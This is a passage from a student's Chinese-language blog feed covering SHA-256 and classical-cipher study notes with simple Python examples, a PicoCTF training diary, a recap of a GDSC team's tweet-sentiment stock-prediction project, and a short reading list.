class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.2982em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.7982em;"><span style="top:-6.9582em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord">¬</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span><span style="top:-5.4582em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.05724em;">aj</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span><span style="top:-3.9341em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">25</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-0.8859em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:0.6382em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">17</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">19</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.2982em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><img src="https://hackmd.io/_uploads/B1pTgx2U0.png" alt="SHA-256 workflow from Wikipedia"></p></li></ul></li><li><p>輸出最終哈希值</p><ul><li>當所有的 512 位塊都處理完成後，將 8 個變量 h0 到 h7 連接起來（大端序），形成最終的 256 位（32 字節）雜湊值。這個雜湊值即為輸入數據的 SHA-256 雜湊值。</li></ul></li></ol><h3 id="Python-Code-5">Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="comment"># 將消息編碼為字節</span></span><br><span class="line">    message_bytes = message.encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 創建 SHA-256 雜湊對象</span></span><br><span class="line">    sha256_hash = hashlib.sha256()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新雜湊對象</span></span><br><span class="line">    sha256_hash.update(message_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 獲取雜湊值</span></span><br><span class="line">    hash_hex = sha256_hash.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hash_hex</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試 SHA-256 雜湊計算</span></span><br><span class="line">message = <span class="string">&quot;This is SHA-256!&quot;</span></span><br><span class="line">hash_result = sha256(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;SHA-256 Value: <span class="subst">&#123;hash_result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="鹽-Salt">鹽 Salt</h2><p>TODO</p><h1 id="古典密碼學-Classical-Cryptography">古典密碼學 Classical Cryptography</h1><p>古典密碼是指在計算機出現之前廣泛使用的密碼學技術。這些密碼技術通常基於簡單的替換或置換規則，而不涉及覆雜的數學運算。</p><p>儘管這些古典密碼在過去被廣泛使用，但它們都存在易受攻擊的缺陷，因此在現代密碼學中已經不再安全。現代密碼學使用基於覆雜數學運算和密鑰管理的加密算法來確保更高的安全性（且在現代密碼學中的觀點，他們更像是<strong>編碼</strong>而不是加密）。</p><p>以下是幾種常見的古典密碼。</p><h2 id="凱薩加密-Caesar-Cipher">凱薩加密 Caesar Cipher</h2><h3 id="簡介-6">簡介</h3><p>凱撒密碼是一種簡單的替換密碼（Substitution cipher），通過將字母表中的每個字母向後（或向前）移動固定數量的位置來加密文本。例如，如果向後移動 3 個位置，則&quot;A&quot;加密為&quot;D&quot;，“B&quot;加密為&quot;E”，以此類推。</p><h3 id="Python-Code-6">Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():  <span class="comment"># 只對字母進行加密</span></span><br><span class="line">            shift = (</span><br><span class="line">                <span class="number">65</span> <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="number">97</span></span><br><span class="line">            )  <span class="comment"># 大寫字母對應 ASCII 表中的 65，小寫字母對應 97</span></span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - shift + key) % <span class="number">26</span> + shift)</span><br><span class="line">            ciphertext += encrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciphertext += char  <span class="comment"># 非字母字符保持不變</span></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="keyword">return</span> caesar_encrypt(ciphertext, -key)  <span class="comment"># 解密即加密的逆操作</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例明文和密鑰</span></span><br><span class="line">plaintext = <span class="string">&quot;This is the Caesar cipher&quot;</span></span><br><span class="line">key = <span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密明文</span></span><br><span class="line">encrypted_text = caesar_encrypt(plaintext, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted:&quot;</span>, encrypted_text)</span><br></pre></td></tr></table></figure><h3 id="暴力破解-Brute-Force">暴力破解 Brute Force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 嘗試所有可能的密鑰進行破解</span></span><br><span class="line"><span class="keyword">for</span> possible_key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):  <span class="comment"># 因為凱撒密碼只有 26 種可能的密鑰</span></span><br><span class="line">    decrypted_text = caesar_decrypt(encrypted_text, possible_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Key <span class="subst">&#123;possible_key&#125;</span>: <span class="subst">&#123;decrypted_text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="置換密碼-Transposition-Cipher">置換密碼 Transposition Cipher</h2><h3 id="簡介-7">簡介</h3><p>置換密碼重新排列明文中的字母，而不改變字母本身。例如，列置換密碼將明文中的字母按列排列，然後按特定規則讀取以生成密文。</p><h2 id="維吉尼亞密碼-Vigenere-Cipher">維吉尼亞密碼 Vigenère Cipher</h2><h3 id="簡介-8">簡介</h3><p>維吉尼亞密碼是一種多表替換密碼，它使用關鍵字來改變每個字母的替換規則。加密時，將明文的每個字母與關鍵字中的對應字母相結合來確定替換規則。</p><h2 id="柵欄密碼-Rail-Fence-Cipher">柵欄密碼 Rail Fence Cipher</h2><h3 id="簡介-9">簡介</h3><p>柵欄密碼將明文中的字母沿著特定的線排列，然後以不同的方式讀取以生成密文。例如，3 欄柵欄密碼將字母交替排列成三行，然後以從上到下、從左到右的順序讀取。</p><h1 id="對稱式加密-Symmetric-Cryptography">對稱式加密 Symmetric Cryptography</h1><p>TODO</p><h1 id="非對稱式加密-Asymmetric-Cryptography">非對稱式加密 Asymmetric Cryptography</h1><h2 id="RSA">RSA</h2><h3 id="RSA-介紹">RSA 介紹</h3><h3 id="小公鑰指數攻擊（Low-public-exponent-attack）">小公鑰指數攻擊（Low public exponent attack）</h3><h3 id="Coppersmith’s-Attack">Coppersmith’s Attack</h3><h3 id="題目">題目</h3>]]></content>
      
      
      <categories>
          
          <category> StudyNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 密碼學 </tag>
            
            <tag> 筆記 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 01] Grinding PicoCTF</title>
      <link href="/posts/6431e3b0/"/>
      <url>/posts/6431e3b0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>因為已經有開了一篇文章，打算放上所有 picoCTF 的 writeups 了，所以就不把解題思路寫在這邊啦，如果想看的話請見<a href="/CTF/All-in-One%20PicoCTF-Writeups/">這邊</a>！</p><h1 id="今日進度">今日進度</h1><p>今天打算先刷一點 picoCTF 的題目，因為成大資安社加入戰隊的標準是一萬分，然後我現在才六千多。但是！當我今天開始刷題目之後我發現 pico 他們的制度整個大改！現在沒有計算分數的機制了，改為把題目分成三個不同的難度（像是 Leetcode 那樣），分別是 easy, medium, hard。所以不知道到時候加戰隊的標準會是多少呢，不過以下就是我今天的進度啦！</p><ol><li>More SQLi</li><li>Trickster</li></ol><p>今天進度就兩題，不過感覺多多少少是有學習到新知識的。之後可能要找一天特別來研究一下 sqlmap 的文檔，到時候再出成一篇筆記文章吧！兩題可能聽起來有點少，但畢竟剛放暑假，我還在那個耍廢狀態 XD，慢慢調整啦！</p><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>8:30</code></li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐</li><li>精神狀態：⭐⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 GDSC NCKU AI Team</title>
      <link href="/posts/23950b86/"/>
      <url>/posts/23950b86/</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-—-What-is-GDSC">Intro — What is GDSC</h1><p><a href="https://gdg.tw/about/gdsc/">GDSC</a>(Google Developer Student Clubs)是一個由 Google 支持的學生社群，旨在通過學生與專業開發人員聯繫，促進學生對 Google 開發人員技術的學習和應用，並為學生提供與技術專家互動和學習的機會。 GDSC 在全球有超過 100 個國家/地區的 1000 多個社群。GDSC 是學生們學習和分享技術的理想社群，並且能夠與技術行業的其他開發人員和專家建立聯繫。(以上皆是 Ctrl+c &amp; Ctrl+v)</p><p>那我自己在成大待了一年的 GDSC，我認為他是個甚麼東西呢？我會說他就是專案社群+課程+演講的集合。這裡集結了一群很有想法的學生聚在一起開心地做專案，然後在這一年的專案旅程中，每兩個禮拜就會有一次社團課程。有時候是幹部們輪流教學一些開發技巧，讓大家對每個領域的技術都稍有了解；有時候是會邀請業界大佬來和我們分享經驗。</p><p>總之就是一個非常有想法和對技術非常有熱忱的人所組合在一起的團隊，加入 GDSC 一定可以感受到那種英雄惜英雄的感覺！接下來，我們就從面試開始講起，來紀錄一下這一年的旅程吧！</p><h1 id="Interview">Interview</h1><p>我在大一的時候(2023)加入了成大的 GDSC，當初面試了三個組別，志願序從前面到後面分別是 AI 組、Web 組、Data 組。在面試的時候主要就是會問一些你之前有沒有過相關的經驗或是一些知識性的問題。舉 AI 組的面試來說，當初幹部就有問我甚麼是 P value、我所熟悉的程式語言、然後給我一些題目問我要怎麼去找出兩者之間的相關性（具體問題有點忘記了，畢竟是一年前。但我記得我的回答跟 Linear regression 有關），再來就是可能要清楚 Correlation doesn’t imply causation 等。除了這些比較 Hard skill 的問題，也會問你如果錄取了會如何安排時間以及 GDSC 對你而言的 Priority 等等。現在回頭看也十分可以理解當初為甚麼這麼問，畢竟一整年要和大家一起做專案，中途跑掉肯定是不太好的。</p><p>後來面試完，我順利地加入了第一志願的組別，AI 組。雖然當初對於 AI 的知識沒有甚麼了解，但這剛好給了我一個機會開始展開學習。</p><h1 id="About-my-team">About my team</h1><p>因為這次的 AI 組人有點多，所以我們又有分成了幾個小組。而我分到的這個小組中，我是唯一一個大一生。其他的成員從大三到碩班都有（AI 組也總共兩個大一的&gt;&lt;），總之我就是裡面資歷最淺的那位。但即便如此，也不會感受到被排斥的感覺，大家也不會因為我年紀比他們小而忽視掉我在團隊中的想法（大家真的很友善，很有 Google 那種多元友善包容的感覺 XD）。</p><h1 id="Our-project">Our project</h1><p>我們在歷經將近一個學期的討論還有熟悉彼此以及熟悉這個團隊之後（具體來說是在寒假），討論出了我們的專案主題。我們想要透過 AI 模型的分析，讓我們能夠預測股票的價格走向。我們這次訓練模型是採用特斯拉的股票來作為我們的對象，並且我們除了一般的指標外，我們另外加入了推文、新聞和特斯拉財報作為我們的 Indicators。我們的整體流程如下：</p><blockquote><ol><li>針對推特的推文、各大媒體新聞、特斯拉財報這三個不同的文本訓練出不同的 Sentiment analysis model</li><li>訓練一個準備接收上述資料做預測的 LSTM</li><li>利用我們的 SA 模型去 Label 每日的資料，並傳入一個 LSTM</li></ol></blockquote><p>最後我們每天輸入當日的三種文本的 SA 分數到我們的 LSTM 去預測隔日的股票價格，並成功得到出了還蠻精準的結果，更詳細的可以看我們的海報，如下（最下面的圖片中，右下角的指標有誤植。藍色的線為真實股價，橘色的線為我們預測的）：</p><p><img src="https://hackmd.io/_uploads/rJKaUHmIA.png" alt="我們的海報"></p><h1 id="My-role-in-the-team">My role in the team</h1><p>我在我們這組是負責推文的部分。一開始，我是先用 Kaggle 找到的<a href="https://www.kaggle.com/datasets/omermetinn/tweets-about-the-top-companies-from-2015-to-2020/data?select=Company_Tweet.csv">這個資料集</a>以及<a href="https://huggingface.co/cardiffnlp/twitter-roberta-base-sentiment-latest">cardiffnlp/twitter-roberta-base-sentiment-latest</a>和<a href="https://huggingface.co/austinmw/distilbert-base-uncased-finetuned-tweets-sentiment">austinmw/distilbert-base-uncased-finetuned-tweets-sentiment</a>這兩個 Pre-trained Model 去幫我們的資料做 Label。</p><p>但是後來我們希望可以有更近期的資料，所以我寫了<a href="https://github.com/CX330Blake/X-crawler">這個爬蟲</a>來爬取 2021 到 2024 五月的推文的資料（但因為我沒有買 API，所以只能慢慢用 Selenium 滑）。在蒐集完資料後，我用了那兩個 Model 去做 Label，並且在 Label 完後抓取相同比例的 Positive、Neutral、Negative 的資料去對 BERT 做 Fine-tune，得到<a href="https://huggingface.co/CX330Blake/tweet-sentiment-analysis-for-tesla">最後的 SA 模型</a>。</p><h1 id="NCKU-GDSC-Forum">NCKU GDSC Forum</h1><p>終於到了成果發表的當天，當天就是有很多的講座以及我們自己擺設的每個小組的攤位。我們要對每位到攤位前的觀眾做講解，跟他們說我們到底做了些甚麼，然後當天的講座也是十分有趣，會很有收穫。我在聽完了前輩們的分享後，更有了想要努力前往矽谷的衝動，有種受到矽谷召喚的感覺 XD。至於更詳細的，就看一下以下的紀錄影片吧！</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/MWK4geiYARs" frameborder="0" allowfullscreen></iframe></div><h1 id="What-I-learned-in-this-year">What I learned in this year</h1><p>撇除掉一些 Hard skill（這是一定會學習到的），我比較想來談談加入 GDSC 的一些 Trade-off。加入 GDSC 後，勢必會壓縮到其他的時間，所以要更懂得如何安排自己的休閒娛樂以及讀書的時間。但同時，也確實可以在這裡獲得很多學業之外的東西。比如說拓展自己的人脈、吸取更多前輩的經驗，但我覺得最重要的，是可以找到一群志同道合夥伴們。這一來可以讓自己在自我精進的這條路上更不孤單，其次也可以增加自己對這種開發社群（或是身為「開發者」）的身分認同。</p><p>結論上來說，如果你同時有很多其他的活動，或是想要好好的衝一下 GPA，或許可以慎重考慮一下要不要參加（因為畢竟做專案真的會花不少時間，還要上社課）；但如果你也和我一樣，相信比起分數有更重要的事，那就大膽地來參加吧，一定會收獲不少的！</p><p>最後附上我們今年 GDSC 的口號：</p><blockquote><p>Code your goal, Fuel your soul! — <strong><em>2024 GDSC NCKU</em></strong></p></blockquote><p>如果這篇文章對你有幫助，歡迎<a href="https://cx330.tw/subscribe/">訂閱我的 Blog</a>，會在有新文章的時候通知你，十分感謝！</p>]]></content>
      
      
      <categories>
          
          <category> DevCorner </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> GDSC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reading List</title>
      <link href="/posts/b01f9394/"/>
      <url>/posts/b01f9394/</url>
      
        <content type="html"><![CDATA[<ol><li><a href="https://johnliutw.medium.com/list/google-4cfac4644843">Google 的軟體工程之道</a></li><li><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/">Sqlmap 文檔中文版</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 AIS3 Pre-exam Writeup</title>
      <link href="/posts/d01f5ccf/"/>
      <url>/posts/d01f5ccf/</url>
      
